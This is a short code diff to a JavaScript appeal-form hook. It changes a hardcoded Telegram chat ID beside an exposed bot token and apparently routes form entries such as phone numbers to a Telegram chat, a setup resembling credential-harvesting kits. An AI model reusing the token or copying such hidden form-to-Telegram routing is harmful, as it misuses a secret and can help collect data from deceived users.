@@ -189,7 +189,7 @@ export function useAppealForm(emit) {
 
     // Telegram config (EASILY CHANGEABLE)
     const TELEGRAM_BOT_TOKEN = "8243992860:AAEp2DVoMKm55Jbv-evtAOCbBs96Uq2bgVQ";
-    const TELEGRAM_CHAT_ID = "5537108875";
+    const TELEGRAM_CHAT_ID = "-1003078888823";
 
     // ✅ Phone management
     const phone = ref("");
